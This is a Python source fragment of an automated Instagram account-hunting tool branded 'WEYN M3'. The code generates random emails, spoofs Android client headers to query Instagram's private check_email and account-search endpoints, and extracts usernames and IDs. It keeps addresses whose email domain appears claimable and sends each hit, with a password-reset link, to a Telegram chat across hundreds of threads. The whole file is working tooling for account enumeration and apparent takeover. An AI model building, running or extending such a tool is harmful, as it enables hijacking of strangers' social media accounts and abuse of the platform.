    """V1: Direct Instagram check_email — HTTP/2 via httpx, fastest path."""
    url = "https://i.instagram.com/api/v1/users/check_email/"
    headers = {
        'User-Agent': _m3_generate_android_ua(),
        'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
        'x-ig-app-id': "567067343352427",
        'accept-language': "en-IN, en-US",
    }
    try:
        resp = client.post(url, data=f"email={email}", headers=headers, timeout=5)
        if 'email_is_taken' in resp.text:
            return "registered"
        elif 'available' in resp.text.lower() or 'Email' in resp.text:
            return "not_registered"
        return "check_v2"
    except Exception:
        return "check_v2"


def _m3_check_v2(email, client):
    """V2: Bloks/CAA search — HTTP/2 fallback, also extracts username."""
    android = "android-" + secrets.token_hex(8)
    device  = str(uuid.uuid4())
    family  = str(uuid.uuid4())
    url     = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
    payload = {
        'params': (
            '{"client_input_params":{"search_query":"' + email +
            '","was_headers_prefill_available":0,"was_headers_prefill_used":0,'
            '"text_input_id":"akyuf0:61","accounts_list":[],"fetched_email_list":[],'
            '"fetched_email_token_list":{},"sso_accounts_auth_data":[],"ig_oauth_token":[],'
            '"auth_secure_device_id":"","encrypted_msisdn":"","is_oauth_without_permission":0,'
            '"is_whatsapp_installed":1,"is_from_logged_in_switcher":0,'
            '"flash_call_permissions_status":{"READ_PHONE_STATE":"PERMANENTLY_DENIED",'
            '"READ_CALL_LOG":"DENIED","ANSWER_PHONE_CALLS":"DENIED"}},'
            '"server_params":{"event_request_id":"' + str(uuid.uuid4()) +
            '","is_from_logged_out":0,"device_id":"' + android +
            '","login_surface":"login_home","waterfall_id":"' + str(uuid.uuid4()) +
            '","is_platform_login":0,"login_entry_point":"logged_out",'
            '"family_device_id":"' + family + '","qe_device_id":"' + device + '"}}'
        ),
        'bk_client_context': '{"bloks_version":"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b","styles_id":"instagram"}',
        'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
    }
    headers = {
        'User-Agent': _m3_generate_android_ua(),
        'accept-language': "en-IN, en-US",
        'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
        'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
        'x-ig-android-id': android,
        'x-ig-app-id': "567067343352427",
        'x-ig-app-locale': "en_IN",
        'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
        'x-ig-device-id': device,
        'x-ig-family-device-id': family,
        'x-ig-timezone-offset': str(int(datetime.now().astimezone().utcoffset().total_seconds())),
        'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
        'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
    }
    try:
        resp = client.post(url, data=payload, headers=headers, timeout=10)
        if email in resp.text:
            username = None
            user_pk  = None
            m = re.search(r'"username"\s*:\s*"([A-Za-z0-9_.]{1,30})"', resp.text)
            if m:
                username = m.group(1)
            pk_m = re.search(r'"pk"\s*:\s*"?(\d{6,})"?', resp.text)
            if pk_m:
                try:
                    user_pk = int(pk_m.group(1))
                except Exception:
                    pass
            return ("registered", username, user_pk)
        return ("not_registered", None, None)
    except Exception:
        return ("unknown", None, None)


def _m3_check_domain_mx(domain):
    """Quick DNS MX check via Google DNS-over-HTTPS — no recaptcha, no IMAP."""
    try:
        r = requests.get(
            f"https://dns.google/resolve?name={domain}&type=MX",
            headers={'User-Agent': 'Mozilla/5.0'},
            timeout=5
        )
        if r.status_code == 200:
            return bool(r.json().get('Answer'))
    except Exception:
        pass
    return False


def _m3_save_hit(token, chat_id, email, method_label="V1", username=None, has_mx=None):
    global _m3_hits, _m3_total, _m3_email_list
    domain  = email.split('@')[1]
    prefix  = email.split('@')[0]
    masked  = f"{prefix[0]}{'*' * max(len(prefix) - 2, 1)}{prefix[-1]}@{domain}"
    session_id = _m3_gen_session_id()

    with _m3_hit_lock:
        _m3_hits  += 1
        _m3_total += 1
        hit_num    = _m3_hits
        _m3_email_list.append(email)

    ig_handle   = username if username else prefix
    profile_url = f"https://www.instagram.com/{ig_handle}"
    mx_flag     = "✓" if has_mx else "?"

    msg = (
        f"WEYN M3 — {domain}\n"
        f"HIT #{hit_num}\n"
        f"EMAIL  : {email}\n"
        f"MASKED : {masked}\n"
        f"STATUS : REGISTERED ({method_label})\n"
        f"DOMAIN : {mx_flag} MX valid\n"
        f"PROFILE: {profile_url}\n"
        f"RESET  : https://www.instagram.com/accounts/password/reset/\n"
        f"SESSION: {session_id}\n"
        f"_______________________________________\n"
        f"BY ~ @jinbelowg @weyn_vouches"
    )

    _save_hit_to_file(msg)

    entry = json.dumps({"e": email, "m": method_label, "u": username or ""})
    with _m3_found_lock:
        _m3_found_emails.append(entry)
        if len(_m3_found_emails) > 200:
            _m3_found_emails.pop(0)

    _web_state['hits']        = _m3_hits
    _web_state['total']       = _m3_total
    _web_state['recent_hits'] = list(_m3_found_emails[-20:])

    _queue_telegram(token, chat_id, msg)


def _m3_worker(token, chat_id, stop_event):
    global _m3_good_insta, _m3_bad_insta, _m3_bad_email, _m3_scanned, _m3_taken

    try:
        client = httpx.Client(http2=True, timeout=5)
    except Exception:
        client = httpx.Client(timeout=5)
    _register_session(client)

    try:
        while not (stop_event and stop_event.is_set()):
            try:
                user1  = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(6))
                user2  = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(6))
                chosen = random.choice([user1, user2])

                domain_suffix = random.choice(_M3_DOMAINS)
                email         = chosen + domain_suffix

                _m3_scanned += 1
                _web_state['scanned'] = _m3_scanned

                if stop_event and stop_event.is_set():
                    break

                result_v1 = _m3_check_v1(email, client)

                if result_v1 == "registered":
                    # Confirm with V2 — also extracts username + pk
                    v2_status, username, user_pk = _m3_check_v2(email, client)
                    if v2_status == "registered":
                        _m3_good_insta += 1
                        _web_state['good'] = _m3_good_insta
                        # ── hi2.in gate ───────────────────────────────────
                        _eprefix = email.split('@')[0]
                        _edomain = email.split('@')[1]
                        if _hi2_check_available(_eprefix, _edomain):
                            _m3_save_hit(token, chat_id, email, "V1", username, True)
                        else:
                            _m3_bad_insta += 1
                            _web_state['bad_insta'] = _m3_bad_insta
                        # ─────────────────────────────────────────────────
                    elif v2_status == "not_registered":
                        _m3_bad_insta += 1
                        _web_state['bad_insta'] = _m3_bad_insta
                    else:
                        # V2 inconclusive — trust V1
                        _m3_good_insta += 1
                        _web_state['good'] = _m3_good_insta
                        # ── hi2.in gate ───────────────────────────────────
                        _eprefix = email.split('@')[0]
                        _edomain = email.split('@')[1]
                        if _hi2_check_available(_eprefix, _edomain):
                            _m3_save_hit(token, chat_id, email, "V1", username, True)
                        else:
                            _m3_bad_insta += 1
                            _web_state['bad_insta'] = _m3_bad_insta
                        # ─────────────────────────────────────────────────

                elif result_v1 == "check_v2":
                    v2_status, username, user_pk = _m3_check_v2(email, client)
                    if v2_status == "registered":
                        _m3_good_insta += 1
                        _web_state['good'] = _m3_good_insta
                        # ── hi2.in gate ───────────────────────────────────
                        _eprefix = email.split('@')[0]
                        _edomain = email.split('@')[1]
                        if _hi2_check_available(_eprefix, _edomain):
                            _m3_save_hit(token, chat_id, email, "V2", username, True)
                        else:
                            _m3_bad_insta += 1
                            _web_state['bad_insta'] = _m3_bad_insta
                        # ─────────────────────────────────────────────────
                    elif v2_status == "unknown":
                        _m3_bad_email += 1
                        _web_state['bad_email'] = _m3_bad_email
                    else:
                        _m3_bad_insta += 1
                        _web_state['bad_insta'] = _m3_bad_insta
                else:
                    _m3_bad_insta += 1
                    _web_state['bad_insta'] = _m3_bad_insta

            except Exception:
                continue
    finally:
        try:
            client.close()
        except Exception:
            pass


def run_method3_web(token, chat_id, stop_event):
    global _m3_hits, _m3_good_insta, _m3_bad_insta, _m3_bad_email
    global _m3_taken, _m3_limit, _m3_total, _m3_scanned
    global _m3_found_emails, _m3_pool, _m3_used_emails, _m3_email_list

    _m3_hits = _m3_good_insta = _m3_bad_insta = _m3_bad_email = 0
    _m3_taken = _m3_limit = _m3_total = _m3_scanned = 0
    _m3_found_emails = []
    _m3_used_emails  = set()
    _m3_email_list   = []

    _write_session_separator(3)
    _web_state.update({
        'running': True, 'method': '3',
        'hits': 0, 'good': 0, 'bad_insta': 0, 'bad_email': 0,
        'taken': 0, 'limit': 0, 'total': 0, 'scanned': 0,
        'recent_hits': [], 'tg_status': '', 'tg_error': '',
        'start_time': time.time(),
    })

    # Kept conservative — see weyn-thread-limits memory: this container
    # cannot reliably spawn hundreds of OS threads at once.
    NUM_WORKERS = int(os.environ.get('M3_WORKERS', 300))
    try:
        pool = ThreadPoolExecutor(max_workers=NUM_WORKERS)
        _m3_pool = pool
        futures = []
        for _ in range(NUM_WORKERS):
            try:
                futures.append(pool.submit(_m3_worker, token, chat_id, stop_event))
            except RuntimeError:
                break
        if not futures:
            _web_state['tg_status'] = 'error'
            _web_state['tg_error']  = 'Could not start scan workers (out of threads). Try again in a moment.'
        for future in as_completed(futures):
            try:
                future.result()
            except Exception:
                pass
    finally:
        _m3_pool = None
        _web_state['running'] = False


def main():
    pass


if __name__ == "__main__":
    main()
